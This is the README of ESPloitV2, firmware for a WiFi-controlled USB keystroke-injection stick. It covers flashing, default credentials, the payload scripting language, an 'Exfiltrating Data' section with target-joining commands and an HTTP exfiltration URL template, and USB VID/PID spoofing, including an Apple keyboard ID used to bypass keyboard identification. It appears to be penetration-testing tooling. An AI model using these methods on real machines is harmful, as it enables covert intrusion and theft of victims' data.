# ESPloitV2  
  
ESPloitV2  
  
Created by Corey Harding  
www.LegacySecurityGroup.com / www.Exploit.Agency  
https://github.com/exploitagency/ESPloitV2  
  
ESPloit is a WiFi controlled HID Keyboard Emulator similar to the USB Rubber Ducky by Hak5. This version was created specifically for the Cactus WHID which is a USB stick that utilizes an ESP-12S WiFi module with a serial connection to a 32u4 microcontroller. The device has 4M of flash storage more than capable of storing the firmware and a number of payloads. Unlike the Rubber Ducky this device has WiFi allowing the device to host its own access point or connect to an existing network. This allows users to upload and pick between payloads or even type out "live payloads" without uploading a file, and like the Rubber Ducky, ESPloit allows you to set up a payload to run upon insertion of the device. The device also supports upgrading the firmware over WiFi, deleting payloads, reformatting the file system, WiFi and basic configuration, and more.  
  
ESPloit is distributed under the MIT License. The license and copyright notice can not be removed and must be distributed alongside all future copies of the software.  
  
-----  
Video Demo  
-----  
[![Video Demo](https://raw.githubusercontent.com/exploitagency/ESPloitV2/master/images/MainMenu.png)](https://www.youtube.com/embed/5WTrKvQbK9o)  
  
-----  
Initial Flashing  
-----  
  
Download and Install the Arduino IDE from http://www.Arduino.cc  
Open Arduino IDE.  
Go to File - Preferences. Locate the field "Additional Board Manager URLs:"  
Add "http://arduino.esp8266.com/stable/package_esp8266com_index.json" without quotes. Click "Ok"  
Select Tools - Board - Boards Manager. Search for "esp8266".  
Install "esp8266 by ESP8266 community version 2.3.0". Click "Close".  
Select Sketch - Include Library - Manage Libraries. Search for "Json".  
Install "ArduinoJson by Benoit Blanchon version 5.11.0" and click "Close"  
Download https://github.com/exploitagency/esp8266FTPServer/archive/feature/bbx10_speedup.zip  
Click Sketch - Include Library - Add .ZIP Library and select bbx10_speedup.zip from your Downloads folder.  
The Arduino IDE is now configured and ready for the code.  
  
Use git to clone this repo: https://github.com/exploitagency/ESPloitV2.git  
or  
Download/extract the repo as a zip file: https://github.com/exploitagency/ESPloitV2/archive/master.zip  
  
Load the esp8266Programmer sketch from the flashing folder.  
Select Tools - Board - "LilyPad Arduino USB".  
Select the Port your device is connected to under Tools - Port.  
Upload the sketch.  
  
Open the ESP_Code sketch from the source folder.  
Select Tools - Board - "Generic ESP8266 Module".  
Select Tools - Flash Size - "4M (3M SPIFFS)".  
Select Sketch - "Export Compiled Binary".  
  
Now flash the firmware to the ESP-12S chip using one of the following tools.  
Linux: https://github.com/AprilBrother/esptool  
Example: `python esptool.py --port=/dev/ttyACM0 --baud 115000 write_flash 0x00000 ESP_Code.ino.generic.bin --flash_size 32m`  
Windows: https://github.com/nodemcu/nodemcu-flasher  
  
NOTE: Do not try to connect to the access point or test anything yet, the device won't work until after the next step.  
  
Finally open the Arduino_32u4_code sketch from the source folder.  
Select Tools - Board - "LilyPad Arduino USB".  
Select the Port your device is connected to under Tools - Port.  
Upload the sketch.  
  
Your ESPloit is now ready to configure and or use.  
  
-----  
Initial configuration  
-----  
  
ESPloit by default creates an Access Point with the SSID "Exploit" with a password of "DotAgency".  
Connect to this access point and open a web browser pointed to "http://192.168.1.1"  
You are now greeted with the main menu of ESPloit. From here there are several options.  
  
Upload Payload: Upload a payload.txt file  
Choose Payload: Choose a payload to run  
Live Payload Mode: Type out or copy/paste a payload to run without uploading  
Input Mode: Use the device as a keyboard/mouse substitute  
Configure ESPloit: Configure WiFi and basic settings  
Format File System: Format the file system  
Upgrade ESPloit Firmware: Upgrade the ESP-12S ESPloit firmware from a web browser  
Help: Brings up this help file  
  
The default administration username is "admin" and password "hacktheplanet". This username and password is used to Configure ESPloit or to Upgrade the Firmware.  
  
-----  
Resetting to default configuration/Recovering device  
-----  
  
Plug the device into your computer.  
Open the Arduino IDE.  
Select Tools - Board - "LilyPad Arduino USB".  
Select Tools - Port and the port the device is connected to.  
Select Tools - "Serial Monitor".  
Select "38400 baud".  
Now type in "ResetDefaultConfig:". Without the quotes but be sure to include the colon symbol.  
Click Send.  
You should now receive the following reply "Resetting configuration files back to default settings."  
Wait about 15 seconds and unplug and replug in the device.  
The device has now been reset back to default settings.  
Connect to the Access Point with the SSID "Exploit" with a password of "DotAgency".  
Open a web browser pointed to "http://192.168.1.1"  
The default administration username is "admin" and password "hacktheplanet".  
  
-----  
Configure ESPloit  
-----  
  
Default credentials to access the configuration page:  
username "admin"  
password "hacktheplanet"  
  
WiFi Configuration  
  
Network Type  
Access Point Mode: Create a standalone access point(No Internet Connectivity-Requires Close Proximity)  
Join Existing Network: Join an existing network(Possible Internet Connectivity-Could use Device Remotely)  
  
Hidden: Choose whether or not to use a hidden SSID when creating an access point  
  
SSID: SSID of the access point to create or of the network you are choosing to join  
Password: Password of the access point which you wish to create or of the network you are choosing to join  
Channel: Channel of the access point you are creating  
  
IP: IP to set for ESPloit  
Gateway: Gateway to use, make it the same as ESPloit's IP if an access point or the same as the router if joining a network  
Subnet: Typically set to 255.255.255.0  
  
ESPloit Administration Settings:  
  
Username: Username to configure/upgrade ESPloit  
Password: Password to configure/upgrade ESPloit  
  
Payload Settings  
  
Delay Between Sending Lines of Code in Payload: Delay in milliseconds between sending lines from payload or when manually inserting a "DELAY" in the payload(Default: 2000)  
  
Automatically Deploy Payload Upon Insetion: Choose Yes or No to automatically deploy a payload when inserting the device  
  
Automatic Payload: Choose the location of the payload to run upon insertion  
  
-----  
Scripting a Payload  
-----  
  
ESPloit uses its own scripting language and not Ducky Script. Although using pure Ducky Script may be adopted in the future or other projects 32u4 sketches using Ducky Script can be adapted to work with ESPloit's ESP8266 sketch. Ducky scripts are adaptable though with minimal work. Examples of ESPloit's scripting language can be seen below.  
  
COMMANDS ARE CASE SENSITIVE! Do not insert any spaces after a command unless intentional and as part of a string, etc.  Do not place any blank lines in a payload!  
  
Commenting code:  
--"Rem: Comment"  
--Set comments  
  
Set the default delay for a specific payload:  
--"DefaultDelay:X"  
--Overrides the default delay set in the ESPloit configuration portal but only for this specific payload  
--Delay is in milliseconds and defined as the wait between sending lines in the payload  
--Example: "DefaultDelay:10000" will wait 10 seconds between sending each line in the payload  
  
Set a one time delay between sending lines in payload  
--"CustomDelay:X"  
--The default delay will still apply for all other lines except this one  
--Example: "CustomDelay:5000" will ignore the default delay for this line and waits 5 seconds before sending the next line in the payload  
  
To make a generic delay:  
-"Delay"  
--"Delay" would wait for The Default Delay x 2 before proceeding to next item in payload  
  
For individual keypresses or combinations of key presses:  
-"Press:X" or "Press:X+Y" or "Press:X+Y+Z" and so forth  
--Expects Decimal Key Code Values for X,Y,Z,etc  
--Sending the following "Press:131+114" with the device's USB plugged into a Windows machine would output KEY_LEFT_GUI(Windows_Key)+r thus launching the RUN prompt  
--List of modifier keys(GUI,ALT,CTRL,ETC) at https://www.arduino.cc/en/Reference/KeyboardModifiers  
--ASCII table lookup at http://www.asciitable.com/  
  
To type out strings of text:  
-"Print:XYZ" Types out "XYZ"  
--Sending the following via software serial "Print:www.Exploit.Agency" would type out "www.Exploit.Agency" on the machine connected via USB  
  
To type out strings of text and presses ENTER:  
-"PrintLine:XYZ" Types out "XYZ" then presses ENTER  
--Sending the following "PrintLine:www.Exploit.Agency" would type out "www.Exploit.Agency" on the machine connected via USB and then would press and release the ENTER key  
  
Move Mouse:  
--"MouseMoveUp:X", "MouseMoveDown:X", "MouseMoveLeft:X", "MouseMoveRight:X"  
--Valid range of values for X is 1-127  
--Moves mouse up, down, left, or right by X amount  
--X must be a number  
  
Mouse Click:  
--"MouseClickLEFT:", "MouseClickRIGHT:", "MouseClickMIDDLE:"  
--Clicks the LEFT, RIGHT, or MIDDLE mouse button  
--Case Sensitive  
  
Special Characters/Known Issues:  
Currently the only character that has been found not to work is the "less than" symbol, "&lt;".  
This bug does NOT apply to Live Payload Mode.  
This only applies if you are using Upload Payload, the script will stop uploading when it reaches the "&lt;" symbol.  
The work around for writing a script that requires a "&lt;" is to replace all instances of "&lt;" with "&amp;lt;".  
The script will upload properly and when viewed and/or ran it will replace "&amp;lt;" with "&lt;".  
  
-----  
Uploading a Payload  
-----  
  
Click browse and choose a payload to upload.  
  
Names should not contain any special characters and should stick to letters and numbers only.  
  
Names must be shorter than 21 characters. The SPIFFS file system used has a 31 character limit, 10 characters are used for the folder structure "/payloads/".  
  
You may save several characters by naming payloads without using an extension.  
  
-----  
Choose a Payload  
-----  
  
This is a list of all payloads that have been uploaded.  
  
You may click the payload name to see the contents of a payload.  
  
Click "Run Payload" to run the payload or click "Delete Payload" to delete the payload.  
  
The file size and filesystem information is also listed on this page.  
  
-----  
Live Payload Mode  
-----  
  
Here you may type out or copy/paste a payload to run without uploading.  
  
-----  
List Exfiltrated Data  
-----  
  
Displays any data that has been collected from the victim using ESPloit's exfiltration methods.  
  
-----  
Input Mode  
-----  
  
Use the device as a keyboard/mouse substitute.  
  
-----  
Format File System  
-----  
  
This will erase the contents of the SPIFFS file system including ALL Payloads that have been uploaded.  
Formatting may take up to 90 seconds.  
All current settings will be retained unless you reboot your device during this process.  
  
-----  
Upgrade ESPloit Firmware  
-----  
  
Authenticate using your username and password set in the configuration page.  
  
Default credentials to access the firmware upgrade page:  
username "admin"  
password "hacktheplanet"  
  
Select "Browse" choose the new firmware to be uploaded to the ESP-12S chip and then click "Upgrade".  
  
You will need to manually reset the device upon the browser alerting you that the upgrade was successful.  
  
If you are using this mode to swap the firmware loaded on the ESP-12S chip, and if the new firmware does not support this mode then you must reflash the ESP-12S manually by uploading the programmer sketch to the 32u4 chip and then flash the ESP-12S this way.
  
-----  
Exfiltrating Data  
-----  
  
To exfiltrate data be sure ESPloit and Target machine are on the same network.  
Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.  
  
Windows: netsh wlan set hostednetwork mode=allow ssid="SSID-HERE" key="WIFI-PASSWORD-HERE"  
Linux: nmcli dev wifi connect SSID-HERE password WIFI-PASSWORD-HERE  
  
For HTTP exfiltration method point the target machine to the url listed below:  
http://ESPloit-IP-Here/exfiltrate?file=FILENAME.TXT&data=EXFILTRATED-DATA-HERE  
  
For FTP exfiltration method use the credentials configured in the "Configure ESPloit" page.  
  
See the example payloads for more in depth examples.  
  
-----  
Changing the VID/PID  
-----  
  
WARNING! This information is being provided for educational purposes only, it is illegal to use a VID/PID that you do not own.  
  
Find and edit boards.txt, it may be located somewhere similar to  
Linux: /root/.arduino15/packages/arduino/hardware/avr/1.6.19/  
or  
Windows: C:\Users\USER\AppData\Local\Arduino15\packages\arduino\hardware\avr\1.6.19\  
  
Add the below quote to the end of the boards.txt file.  
RESTART THE ARDUINO IDE!  
Now select Cactus WHID under Tools - Boards instead of LilyPad Arduino USB when you upload the Arduino_32u4_Code sketch.  
<pre style="color:#808080";>
    ##############################################################

    CactusWHID.name=Cactus WHID
    CactusWHID.vid.0=0x1B4F
    CactusWHID.pid.0=0x9207
    CactusWHID.vid.1=0x1B4F
    CactusWHID.pid.1=0x9208

    CactusWHID.upload.tool=avrdude
    CactusWHID.upload.protocol=avr109
    CactusWHID.upload.maximum_size=28672
    CactusWHID.upload.maximum_data_size=2560
    CactusWHID.upload.speed=57600
    CactusWHID.upload.disable_flushing=true
    CactusWHID.upload.use_1200bps_touch=true
    CactusWHID.upload.wait_for_upload_port=true

    CactusWHID.bootloader.tool=avrdude
    CactusWHID.bootloader.low_fuses=0xff
    CactusWHID.bootloader.high_fuses=0xd8
    CactusWHID.bootloader.extended_fuses=0xce
    CactusWHID.bootloader.file=caterina-LilyPadUSB/Caterina-LilyPadUSB.hex
    CactusWHID.bootloader.unlock_bits=0x3F
    CactusWHID.bootloader.lock_bits=0x2F

    CactusWHID.build.mcu=atmega32u4
    CactusWHID.build.f_cpu=8000000L
    CactusWHID.build.vid=0x0000
    CactusWHID.build.pid=0xFFFF
    CactusWHID.build.usb_product="Cactus WHID"
    CactusWHID.build.usb_manufacturer="April Brother"
    CactusWHID.build.board=AVR_LILYPAD_USB
    CactusWHID.build.core=arduino
    CactusWHID.build.variant=leonardo
    CactusWHID.build.extra_flags={build.usb_flags}
</pre>
  
Replace this portion with your spoofed VID/PID.  
"0x0000" and "0xFFFF" are only placeholders and should not be used.  
Replace these with your own personal VID/PID combination  
<pre style="color:#808080";>
    CactusWHID.build.vid=0x0000
    CactusWHID.build.pid=0xFFFF
    CactusWHID.build.usb_product="Cactus WHID"
    CactusWHID.build.usb_manufacturer="April Brother"
</pre>
  
On Apple Devices you can theoretically bypass the unknown keyboard hurdle by spoofing an Apple VID/PID.  
This will run the payload upon insertion vs having to identify the keyboard first.  
DO NOT DO THIS! It is illegal to use a VID/PID that you do not own.  
<pre style="color:#808080";>
    CactusWHID.build.vid=0x05ac
    CactusWHID.build.pid=0x021e
    CactusWHID.build.usb_product="Aluminum Keyboard IT USB"
    CactusWHID.build.usb_manufacturer="Apple Inc."
</pre>
  
-----  
Changing the Keyboard Locale  
-----  
  
This is an easy to use solution from BlueArduino20 that is based off the work from NURRL at <a href="https://github.com/Nurrl/LocaleKeyboard.js" target="_blank">https://github.com/Nurrl/LocaleKeyboard.js</a>  
Linux: <a href="https://github.com/BlueArduino20/LocaleKeyboard.SH" target="_blank">https://github.com/BlueArduino20/LocaleKeyboard.SH</a>  
Windows: <a href="https://github.com/BlueArduino20/LocaleKeyboard.BAT" target="_blank">https://github.com/BlueArduino20/LocaleKeyboard.BAT</a>  
  
-----  
Licensing Information  
-----  
  
Cactus WHID manufactured by April Brother: https://aprbrother.com  
Cactus WHID hardware design by Luca Bongiorni: http://whid.ninja  
  
ESPloitV2 by Corey Harding: https://www.LegacySecurityGroup.com  
Code available at: https://github.com/exploitagency/ESPloitV2  
ESPloitV2 software is licensed under the MIT License  
/*  
 MIT License  
  
 Copyright (c) [2017] [Corey Harding]  
  
 Permission is hereby granted, free of charge, to any person obtaining a copy  
 of this software and associated documentation files (the "Software"), to deal  
 in the Software without restriction, including without limitation the rights  
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell  
 copies of the Software, and to permit persons to whom the Software is  
 furnished to do so, subject to the following conditions:  
  
 The above copyright notice and this permission notice shall be included in all  
 copies or substantial portions of the Software.  
  
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR  
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,  
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE  
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER  
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,  
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE  
 SOFTWARE.  
*/
